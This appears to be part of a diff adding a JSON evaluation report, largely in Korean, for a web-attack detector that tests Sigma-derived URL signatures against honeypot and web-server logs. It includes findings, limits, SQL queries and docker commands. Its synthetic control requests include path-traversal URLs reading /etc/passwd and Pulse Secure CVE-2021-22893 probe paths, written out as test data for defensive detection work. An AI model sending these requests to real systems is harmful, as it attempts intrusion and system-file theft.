+    "method": "GET",
+    "url": "/dana/html5acc/guacamole/",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana-na/nc/nc_gina_ver.txt",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/dana-na/nc/nc_gina_ver.txt",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana-na/auth/saml-logout.cgi?token=AAAA",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/dana-na/auth/saml-logout.cgi?token=AAAA",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana-cached/setup/meeting/x.cgi",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/dana-cached/setup/meeting/x.cgi",
+    "status": 200,
+    "sg1": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "sg1_nostatus": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-cve-2021-22893-pulse-secure-rce"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/dana-na/auth/url_default/welcome.cgi",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/dana-na/auth/url_default/welcome.cgi",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [
+     "ivanti-connect-secure"
+    ],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/meeting/join?id=5",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/meeting/join?id=5",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/index.php?page=../../../etc/passwd",
+    "status": 200,
+    "sg1": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/index.php?page=../../../etc/passwd",
+    "status": 200,
+    "sg1": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/..%252f..%252f..%252fetc%252fpasswd",
+    "status": 400,
+    "sg1": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/..%252f..%252f..%252fetc%252fpasswd",
+    "status": 400,
+    "sg1": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "sg1_nostatus": [
+     "sg-path-traversal-exploitation-attempt"
+    ],
+    "c1": [],
+    "sgx": [
+     "sg-path-traversal-exploitation-attempt"
+    ]
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/static/../img/logo.png",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/static/../img/logo.png",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "/download?file=../../report.pdf",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "/download?file=../../report.pdf",
+    "status": 200,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "web-01",
+    "method": "GET",
+    "url": "",
+    "status": 400,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   },
+   {
+    "sensor": "decoy",
+    "method": "GET",
+    "url": "",
+    "status": 400,
+    "sg1": [],
+    "sg1_nostatus": [],
+    "c1": [],
+    "sgx": []
+   }
+  ],
+  "rolled_back": true
+ },
+ "timing_ms": {
+  "c1 R105": {
+   "signatures": 8,
+   "signals": 25,
+   "median_ms": 2.7
+  },
+  "c1 R106": {
+   "signatures": 5,
+   "signals": 0,
+   "median_ms": 15.8
+  },
+  "sg1 R107": {
+   "signatures": 11,
+   "signals": 0,
+   "median_ms": 56.0
+  },
+  "sgx R107": {
+   "signatures": 94,
+   "signals": 0,
+   "median_ms": 297.2
+  }
+ },
+ "findings": [
+  "실데이터 요청 1,023건(디코이 전부 · web-01 real 0 · 출발지 195 · 2026-09-18 02:28 ~ 2026-09-28 06:30)에 sg1(선정 10 · 서명 11) 0건 · sgx(76 · 서명 94) 0건 · c1 25건(R105 사건 3 · R106 0)",
+  "응답 코드 조건 때문에 빠진 요청 0 (상태 조건을 빼도 0). pattern 만 보면 sg1 서명 2개가 6건(/owa/ 4 · /dana-cached/hc/HostCheckerInstaller.osx 2)에 맞고 둘째 조건에서 빠짐. 6건 모두 c1 R105 사건의 두 스캐너",
+  "R107 사건 0 · 겹치는 c1 사건 없음. 덤프 시점 데이터로 운영 첫 실행(전 기간) 때 R107 사건 · 통보 없음",
+  "정상 시나리오 요청 행 38 에 sg1 0 · sgx 0 · c1 0",
+  "c1 사건 3행 · 사건 키 1,028 md5 가 c1 → sg1 → 정상 → sg1 → c1 전후 같음. SQL · 파이썬 신호 다중집합 6쌍 모두 같음",
+  "디코이 url 은 질의 · 퍼센트 0건이고 / · /admin 밖은 모두 404 → 질의 조건 4개 규칙 · 응답 코드 조건 3개 규칙(서명 4)은 디코이에서 원리상 맞기 어렵다. sgx 의 응답 코드 서명 22개도 404 를 받지 않는다",
+  "합성 대조군(표본 45 × 2 꼴 = 90행, 임시 표 · 롤백): sg1 38 · c1 36 · 둘 다 18 · sg1 만 20 · c1 만 18 · 응답 코드로 빠짐 8 (설계값)",
+  "sgx 26858 의 keywords POST 가 url 의 post-smtp 에 맞은 예: keywords 를 url 에 대는 변환이 뜻과 다른 글자에 걸릴 수 있다(최종은 빠짐)"
+ ],
+ "limits": [
+  "web-01 실 HTTP 0 · 디코이 url 에 질의 없음 · 디코이 응답 대부분 404 → 이 회차의 0 은 재현율 비교가 아니다",
+  "공격 요청(실측 양성)이 없다. c1 R106 도 0",
+  "합성 대조군 수는 표본을 만든 사람이 정한 설계값이다",
+  "정상 분모 요청 행 38 · 작업자 1명 · 출발지 1개",
+  "덤프(9/28 07:30) 뒤 운영 요청은 보지 않았다",
+  "실험 DB 는 볼륨 없는 컨테이너다"
+ ],
+ "needs": [
+  "코드 고침 없음",
+  "결정: R107 statuses 를 디코이에도 그대로 둘지(디코이에서 sg1 서명 4개 · sgx 22개가 사실상 꺼짐). 바꾸면 sg2",
+  "별도 이슈 후보: c1 ivanti-connect-secure 가 /dana-cached/ 를 보지 않는다(두 스캐너 2건을 c1 · Sigma 모두 놓침). 넓히면 c2",
+  "운영 반영 확인 결과 문서에 옮길 것: 첫 실행 영향(R107 0) · 신호 질의 시간 · 한계"
+ ],
+ "queries": [
+  "- 요청 행: `SELECT … FROM events WHERE provenance = 'real' AND eventid = ANY('{nginx.request,decoy.request}')` (규칙 eventids 와 같다 · sensors 제한 없음). 정상 표식 행 = `message ~ '^\\[정상 시나리오 [A-Z][0-9]{2}\\] ' AND user_agent LIKE 'OpsLoop-Normal49/%'`, 실데이터 = 그 밖.",
+  "- 맞은 요청 수: 서명마다 `detect.url_signature_fullmatch(sig, http_method, url, http_status)` 로 line_hash 집합을 만들고 규칙(원본 파일)마다 합집합의 크기. 같은 답을 `detect.signals_url_signature(cur, rule, None, None)`(탐지기와 같은 SQL, 읽기 전용 트랜잭션)로 받아 (시각 · 출발지 · eventid · 발생원 · 메서드 · url · 응답 코드 · 서명 목록) 다중집합이 같은지 대조(sg1 0 = 0 · c1 R105 25 = 25 · R106 0 · sgx 0, 상태 뺀 판 포함 모두 같음).",
+  "- 발생원: 맞은 요청의 `sensor`(decoy · web-01) 별 개수. 출발지 수: 맞은 요청의 `src_ip` 서로 다른 수.",
+  "- c1 도(짝 / 아무): 그 규칙 합집합 ∩ c1 짝 서명(선정표 c1_pair)의 line_hash 집합 / ∩ c1 13개 서명 합집합.",
+  "- Sigma 만: 규칙 합집합 − c1 13개 합집합. c1 만: c1 짝 서명 집합 − 규칙 합집합(실데이터). 10번은 짝이 없어 R106 apache-path-traversal 을 참고로 댔다.",
+  "- 응답 코드로 빠짐: 서명에서 `statuses` 만 지운 사본으로 같은 셈을 해 (사본 합집합 − 원래 합집합) 크기.",
+  "- 조건 단계별: pattern → all_patterns → not_patterns → methods → statuses 순서로 파이썬 fullmatch(re.I · re.S)를 더해 남는 행 수. 최종 단계가 위 매치 집합과 같은지 단언했다.",
+  "- R107 사건 수: `SELECT count(*) FROM incidents WHERE rule_version = 'sg1'` (실행 뒤). 서명별은 `jsonb_array_elements_text(evidence -> 'signatures')`.",
+  "- 겹치는 c1 사건: `incidents i JOIN incidents c ON c.rule_version = 'c1' AND c.actor_ip = i.actor_ip AND c.first_ts <= i.last_ts AND c.last_ts >= i.first_ts WHERE i.rule_version = 'sg1'`.",
+  "- 정상 걸림: 위 매치 집합 ∩ 정상 표식 행(요청 행 38). 정상 구간 사건은 `detect.py --rules rules_sigma.json --run --since 2026-09-28T08:30:00+00:00 --until 2026-09-28T16:30:00+00:00` 의 요약.",
+  "- 70개: `classify.py` 가 원본 86개의 detection 필드를 모아 url 필드 · cs-method · sc-status · keywords 밖의 필드가 없는 규칙을 센 것(70). sgx 매치는 위와 같은 셈을 `rules_sigma_lab.json` 에 한 것.",
+  "- c1 불변: c1 사건 행 `(incident_key, last_ts, signal_count, session_count, md5(evidence::text), severity)` 과 `md5(string_agg(incident_key, E'\\n' ORDER BY incident_key COLLATE \"C\"))` 를 실행 전 · sg1 뒤 · 마지막에 글자 대조.",
+  "- 복원 지문: `sql/fingerprint.sql`(표별 count · events 최소 · 최대 ts · 사건 키 md5 · 버전별 사건 수)."
+ ],
+ "commands": [
+  "S=<스크래치>/sigma54   # 실험 DB 비밀번호는 <스크래치>/lab54.pw (0600, 출력 · 증거에 없음)",
+  "docker run -d --rm --name opsloop-lab54 -e POSTGRES_USER=opsloop -e POSTGRES_PASSWORD=<실험 DB 비밀번호> -e POSTGRES_DB=opsloop -p 127.0.0.1:55449:5432 postgres:16-alpine",
+  "G=~/opsloop-backup/opsloop-20260928-0730.globals.sql; grep -E '^(CREATE ROLE|ALTER ROLE|GRANT) ' \"$G\" | grep -vx 'CREATE ROLE opsloop;' | grep -vi password | docker exec -i opsloop-lab54 psql -U opsloop -d postgres -v ON_ERROR_STOP=1 -q",
+  "docker exec -i opsloop-lab54 pg_restore -U opsloop -d opsloop --no-owner --exit-on-error < ~/opsloop-backup/opsloop-20260928-0730.dump",
+  "docker exec -i opsloop-lab54 psql -U opsloop -d opsloop -At -F ' | ' < $S/sql/fingerprint.sql",
+  "docker run -d --rm --name opsloop-lab54-py --network container:opsloop-lab54 -v ~/opsloop-repo:/repo:ro -v $S:/out -v <스크래치>/lab54.pw:/pw:ro -v <스크래치>/sigma-07ec293a…:/sigma-src:ro -w /repo python:3.12-slim sleep infinity",
+  "docker exec opsloop-lab54-py pip install psycopg2-binary pyyaml",
+  "docker exec opsloop-lab54-py python3 detector/sigma_convert.py build --check                       # 같다",
+  "docker exec opsloop-lab54-py python3 detector/sigma_convert.py lab /sigma-src --out /out/rules_sigma_lab.regen.json   # 저장본과 글자 같음",
+  "docker exec opsloop-lab54-py python3 /out/classify.py                                               # 86 · 70",
+  "docker exec opsloop-lab54-py python3 /out/analyze.py /out/req_before_normal.json                    # 읽기 전용",
+  "docker exec opsloop-lab54-py sh -c 'DATABASE_URL=… python3 detector/detect.py --rules detector/rules_cve.json --run'     # 29972",
+  "docker exec opsloop-lab54-py sh -c 'DATABASE_URL=… python3 detector/detect.py --rules detector/rules_sigma.json --run'   # 29973",
+  "docker exec opsloop-lab54-py sh -c 'python3 detector/normal_traffic.py --db-url … --allow-port 5432'          # dry-run",
+  "docker exec opsloop-lab54-py sh -c 'python3 detector/normal_traffic.py --db-url … --allow-port 5432 --apply'  # 66행",
+  "docker exec opsloop-lab54-py python3 /out/analyze.py /out/req_after_normal.json                     # 읽기 전용",
+  "docker exec opsloop-lab54-py python3 /out/control.py                                                # 임시 표 · 롤백",
+  "docker exec opsloop-lab54-py sh -c 'DATABASE_URL=… python3 detector/detect.py --rules detector/rules_sigma.json --run --since 2026-09-28T08:30:00+00:00 --until 2026-09-28T16:30:00+00:00'   # 29974",
+  "docker exec opsloop-lab54-py sh -c 'DATABASE_URL=… python3 detector/detect.py --rules detector/rules_cve.json --run'     # 29975",
+  "docker exec -i opsloop-lab54 psql -U opsloop -d opsloop -At -F ' | ' < $S/sql/c1_snapshot.sql       # 전 · 후 대조",
+  "docker exec -i opsloop-lab54 psql -U opsloop -d opsloop -At -F ' | ' < $S/sql/incidents.sql",
+  "docker exec opsloop-lab54-py python3 /out/timing.py"
+ ]
+}
